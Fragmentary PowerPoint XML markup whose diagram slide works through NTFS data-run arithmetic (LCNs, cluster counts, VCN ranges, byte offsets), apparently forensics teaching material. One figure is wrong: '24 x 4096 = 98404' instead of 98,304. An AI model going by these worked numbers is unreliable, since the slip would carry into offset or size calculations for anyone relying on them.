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30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slideLayouts/slideLayout11.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/diagrams/quickStyle1.xml" ContentType="application/vnd.openxmlformats-officedocument.drawingml.diagramStyle+xml"/>
  <Override PartName="/ppt/slides/slide35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diagrams/data1.xml" ContentType="application/vnd.openxmlformats-officedocument.drawingml.diagramData+xml"/>
  <Override PartName="/ppt/diagrams/drawing1.xml" ContentType="application/vnd.openxmlformats-officedocument.drawingml.diagramDrawing+xml"/>
  <Override PartName="/ppt/slides/slide32.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/diagrams/layout1.xml" ContentType="application/vnd.openxmlformats-officedocument.drawingml.diagramLayout+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide26.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide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28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26.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide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diagrams/colors1.xml" ContentType="application/vnd.openxmlformats-officedocument.drawingml.diagramColors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</p:sldIdLst>
  <p:sldSz cx="12192000" cy="6858000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:defaultTextStyle>
    <a:defPPr>
      <a:defRPr lang="zh-TW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E8034E78-7F5D-4C2E-B375-FC64B27BC917}" styleName="Dark Style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  <a:fill>
          <a:solidFill>
            <a:schemeClr val="dk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dk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12700">
              <a:noFill/>
            </a:ln>
          </a:top>
        </a:tcBdr>
        <a:fill>
          <a:solidFill>
            <a:schemeClr val="dk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12700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  <a:fill>
          <a:solidFill>
            <a:schemeClr val="accent3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 /><Relationship Id="rId45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diagrams/_rels/data1.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>
</file>

<file path=ppt/diagrams/_rels/drawing1.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"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lignNode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1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repeat">
      <a:schemeClr val="accent1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bgSib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sibTrans1D1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1"/>
    </dgm:fillClrLst>
    <dgm:linClrLst hueDir="cw" meth="repeat">
      <a:schemeClr val="accent1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1">
        <a:tint val="60000"/>
      </a:schemeClr>
    </dgm:fillClrLst>
    <dgm:linClrLst hueDir="cw" meth="repeat">
      <a:schemeClr val="accent1">
        <a:tint val="60000"/>
      </a:schemeClr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3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4">
    <dgm:fillClrLst hueDir="cw" meth="repeat">
      <a:schemeClr val="accen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1"/>
    </dgm:fillClrLst>
    <dgm:linClrLst hueDir="cw" meth="repeat">
      <a:schemeClr val="accent1">
        <a:shade val="6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1"/>
    </dgm:fillClrLst>
    <dgm:linClrLst hueDir="cw" meth="repeat">
      <a:schemeClr val="accent1">
        <a:shade val="8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1">
        <a:alpha val="90000"/>
        <a:tint val="40000"/>
      </a:schemeClr>
    </dgm:fillClrLst>
    <dgm:linClrLst hueDir="cw" meth="repeat">
      <a:schemeClr val="accent1">
        <a:alpha val="90000"/>
        <a:tint val="4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1">
        <a:tint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dkBgShp">
    <dgm:fillClrLst hueDir="cw" meth="repeat">
      <a:schemeClr val="accent1">
        <a:shade val="8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1">
        <a:tint val="6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lt1">
        <a:alpha val="0"/>
      </a:schemeClr>
    </dgm:fillClrLst>
    <dgm:linClrLst hueDir="cw" meth="repeat">
      <a:schemeClr val="dk1">
        <a:alpha val="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57F86B12-4B7C-4FEA-ADDA-303ABA1A058A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0"/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A320BBA4-B6A6-4766-AB13-8DE6E4C89A29}" type="node">
      <dgm:prSet phldr="0" phldrT="[Text]"/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" rtlCol="0" fromWordArt="0" anchor="ctr" forceAA="0" upright="0" compatLnSpc="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="l" defTabSz="1689098">
            <a:lnSpc>
              <a:spcPct val="0"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPts val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Caladea"/>
              <a:ea typeface="Caladea"/>
              <a:cs typeface="Caladea"/>
            </a:rPr>
            <a:t>1</a:t>
          </a:r>
          <a:endParaRPr lang="zh-TW" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Caladea"/>
            <a:cs typeface="Caladea"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{995D0939-7363-4715-B761-71082B9E3587}" type="parTrans" cxnId="{25B32F11-5613-40C0-BEB6-F06AE8EBD05E}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2D66CEAC-AD0E-4BBB-9AE5-BEC958DD8D61}" type="sibTrans" cxnId="{25B32F11-5613-40C0-BEB6-F06AE8EBD05E}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{512A9BCB-8810-4156-9847-A7D258E1C10B}" type="node">
      <dgm:prSet phldr="0" phldrT="[Text]" custT="1"/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" rtlCol="0" fromWordArt="0" anchor="ctr" forceAA="0" upright="0" compatLnSpc="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>      LCN = 12,592, length = 24 clusters (VCN 0-23)</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{66D02BCB-71CB-49DC-BC8B-AAC332B6B6D8}" type="parTrans" cxnId="{DA2FE200-7DBE-4CFA-858C-4ABB66EE501D}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5013CD08-6EC2-439C-A614-6CB2C9D11DD4}" type="sibTrans" cxnId="{DA2FE200-7DBE-4CFA-858C-4ABB66EE501D}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2630FCFA-90EE-4A9F-B769-05F9FA3692D6}" type="node">
      <dgm:prSet phldr="0" phldrT="[Text]" custT="1"/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" rtlCol="0" fromWordArt="0" anchor="ctr" forceAA="0" upright="0" compatLnSpc="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>      offset = 12,592 x 4096 = 51,576,832</a:t>
          </a:r>
          <a:endParaRPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:ea typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>      run 1 bytes = 24 x 4096 = 98404</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1">
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0BA61F09-6A0F-494F-AA3A-C8421C165902}" type="parTrans" cxnId="{E86B41F1-DC7F-49E5-B6AD-9CA48C754051}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{828421A0-02E9-4B16-95B0-4F95AC16511A}" type="sibTrans" cxnId="{E86B41F1-DC7F-49E5-B6AD-9CA48C754051}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6F3CC5B1-39AF-4E37-86E7-2120949C889A}" type="node">
      <dgm:prSet phldr="0" phldrT="[Text]"/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" rtlCol="0" fromWordArt="0" anchor="ctr" forceAA="0" upright="0" compatLnSpc="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="l" defTabSz="1689098">
            <a:lnSpc>
              <a:spcPct val="0"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPts val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Caladea"/>
              <a:ea typeface="Caladea"/>
              <a:cs typeface="Caladea"/>
            </a:rPr>
            <a:t>2</a:t>
          </a:r>
          <a:endParaRPr lang="zh-TW" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Caladea"/>
            <a:cs typeface="Caladea"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{886A3447-E2BB-4FC9-A070-08980BB7F132}" type="parTrans" cxnId="{33F36D82-6066-45AB-AEB6-42ABCACE7776}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1A890983-AC36-4FB0-8C41-C62FC9218C7A}" type="sibTrans" cxnId="{33F36D82-6066-45AB-AEB6-42ABCACE7776}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C8507FAA-58F1-43E2-8DB5-E84DF64F141D}" type="node">
      <dgm:prSet phldr="0" phldrT="[Text]" custT="1"/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" rtlCol="0" fromWordArt="0" anchor="ctr" forceAA="0" upright="0" compatLnSpc="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>LCN =  7,592, length = 20 clusters  (VCN 24-43)</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2A40080A-0F5A-4CB7-8808-536E4534EF5C}" type="parTrans" cxnId="{F70EA80D-7A46-4705-BD6D-0B775A83D4C4}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AA522E9B-02C6-485B-929D-8F1C4F4C40EF}" type="sibTrans" cxnId="{F70EA80D-7A46-4705-BD6D-0B775A83D4C4}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F077E0D5-8EC5-4A71-9EC2-2628C5F94117}" type="node">
      <dgm:prSet phldr="0" phldrT="[Text]" custT="1"/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" rtlCol="0" fromWordArt="0" anchor="ctr" forceAA="0" upright="0" compatLnSpc="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>offset = 7,592 x 4096 = 31,096,832</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>run 2 bytes = 20 x 4096 = 81920</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1">
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{68A16127-1509-43BB-A7EF-6D381FBD29C1}" type="parTrans" cxnId="{C59CA22C-9A88-414A-97B7-EC8BB1FA3272}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{22938F7A-23E1-4BEE-A1F2-2A65C4E06450}" type="sibTrans" cxnId="{C59CA22C-9A88-414A-97B7-EC8BB1FA3272}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3D597125-9DD6-4646-9AB5-CADD30F44BA2}" type="node">
      <dgm:prSet phldr="0" phldrT="[Text]"/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" rtlCol="0" fromWordArt="0" anchor="ctr" forceAA="0" upright="0" compatLnSpc="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="l" defTabSz="1689098">
            <a:lnSpc>
              <a:spcPct val="0"/>
            </a:lnSpc>
            <a:spcBef>
              <a:spcPts val="0"/>
            </a:spcBef>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Caladea"/>
              <a:ea typeface="Caladea"/>
              <a:cs typeface="Caladea"/>
            </a:rPr>
            <a:t>3</a:t>
          </a:r>
          <a:endParaRPr lang="zh-TW" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Caladea"/>
            <a:cs typeface="Caladea"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{22A3D2B9-0E69-4ADE-AB1C-F6CA8CC08259}" type="parTrans" cxnId="{A1EEDC1C-3B18-49B8-8DBB-EEAE0FFEC25D}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2DC7291B-19B6-4281-A704-DDAC5C199545}" type="sibTrans" cxnId="{A1EEDC1C-3B18-49B8-8DBB-EEAE0FFEC25D}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E58DFE4E-6996-4390-8868-136E0077A2CE}" type="node">
      <dgm:prSet phldr="0" phldrT="[Text]" custT="1"/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" rtlCol="0" fromWordArt="0" anchor="ctr" forceAA="0" upright="0" compatLnSpc="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>LCN = 16,592, length = 14 clusters  (VCN 44-57)</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E6DA6346-D606-4B23-877E-6F746BBEA74D}" type="parTrans" cxnId="{23F9BB13-53D2-44A9-8E64-1F7C1EB6730B}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{99680B4B-2F23-499E-B5BB-1ADCE471C7AA}" type="sibTrans" cxnId="{23F9BB13-53D2-44A9-8E64-1F7C1EB6730B}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8B5DC24E-8BCF-4FB3-BC31-51E4DD9317AF}" type="node">
      <dgm:prSet phldr="0" phldrT="[Text]" custT="1"/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr vertOverflow="overflow" horzOverflow="overflow" vert="horz" rtlCol="0" fromWordArt="0" anchor="ctr" forceAA="0" upright="0" compatLnSpc="0"/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>offset = 16,592 x 4096 = 67960832</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
            <a:solidFill>
              <a:schemeClr val="dk1"/>
            </a:solidFill>
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
        <a:p>
          <a:pPr>
            <a:spcAft>
              <a:spcPts val="839"/>
            </a:spcAft>
            <a:defRPr/>
          </a:pPr>
          <a:r>
            <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:ea typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:rPr>
            <a:t>run 3 bytes = 14 x 4096 = 57344</a:t>
          </a:r>
          <a:endParaRPr sz="2000" b="1">
            <a:latin typeface="Liberation Serif"/>
            <a:cs typeface="Liberation Serif"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{83D60278-1BDF-4097-B242-912162FC0C10}" type="parTrans" cxnId="{0F9C728E-1003-4C5D-B0E1-68F0144580B8}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8721F462-2A58-4003-9FFC-0F4EA09CA374}" type="sibTrans" cxnId="{0F9C728E-1003-4C5D-B0E1-68F0144580B8}">
      <dgm:prSet/>
      <dgm:spPr bwMode="auto"/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr>
            <a:defRPr/>
          </a:pPr>
          <a:endParaRPr/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{63D4614A-F897-46AF-A1D8-68B89D2F4446}" type="pres">
      <dgm:prSet presAssocID="{57F86B12-4B7C-4FEA-ADDA-303ABA1A058A}" presName="linearFlow" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir val="norm"/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr bwMode="auto"/>
    </dgm:pt>
    <dgm:pt modelId="{CDFAE62F-5B44-4A8D-AC21-2088DF8F676E}" type="pres">
      <dgm:prSet presAssocID="{A320BBA4-B6A6-4766-AB13-8DE6E4C89A29}" presName="composite" presStyleCnt="0"/>
      <dgm:spPr bwMode="auto"/>
    </dgm:pt>
    <dgm:pt modelId="{17D82F43-0080-46F1-8CDC-D6A925F3629B}" type="pres">
      <dgm:prSet presAssocID="{A320BBA4-B6A6-4766-AB13-8DE6E4C89A29}" presName="parentText" presStyleLbl="alignNode1" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:chMax val="1"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr bwMode="auto"/>
    </dgm:pt>
    <dgm:pt modelId="{40DBFC1C-2F42-4F4A-8F3E-FACA60C06695}" type="pres">
      <dgm:prSet custLinFactY="-216241" presAssocID="{A320BBA4-B6A6-4766-AB13-8DE6E4C89A29}" presName="descendantText" presStyleLbl="alignAcc1" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr bwMode="auto"/>
    </dgm:pt>
    <dgm:pt modelId="{E5E9A4F4-9EBC-4E37-BE6C-E2FFEE196DD9}" type="pres">
      <dgm:prSet presAssocID="{2D66CEAC-AD0E-4BBB-9AE5-BEC958DD8D61}" presName="sp" presStyleCnt="0"/>
      <dgm:spPr bwMode="auto"/>
    </dgm:pt>
    <dgm:pt modelId="{A319E543-DBA8-4FEC-8F57-E7E93F57AC50}" type="pres">
      <dgm:prSet presAssocID="{6F3CC5B1-39AF-4E37-86E7-2120949C889A}" presName="composite" presStyleCnt="0"/>
      <dgm:spPr bwMode="auto"/>
    </dgm:pt>
    <dgm:pt modelId="{1655B817-94DA-48EF-987F-A3F1D35039B7}" type="pres">
      <dgm:prSet presAssocID="{6F3CC5B1-39AF-4E37-86E7-2120949C889A}" presName="parentText" presStyleLbl="alignNode1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:chMax val="1"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr bwMode="auto"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accent4">
              <a:lumMod val="60000"/>
              <a:lumOff val="40000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:prstDash val="solid"/>
          <a:miter lim="800000"/>
        </a:ln>
      </dgm:spPr>
    </dgm:pt>
    <dgm:pt modelId="{2747AAF1-42FA-4449-8F72-416DE9BB4869}" type="pres">
      <dgm:prSet presAssocID="{6F3CC5B1-39AF-4E37-86E7-2120949C889A}" presName="descendantText" presStyleLbl="alignAcc1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr bwMode="auto"/>
    </dgm:pt>
    <dgm:pt modelId="{77CBD59E-38DC-496F-A267-192D76B119A9}" type="pres">
      <dgm:prSet presAssocID="{1A890983-AC36-4FB0-8C41-C62FC9218C7A}" presName="sp" presStyleCnt="0"/>
      <dgm:spPr bwMode="auto"/>
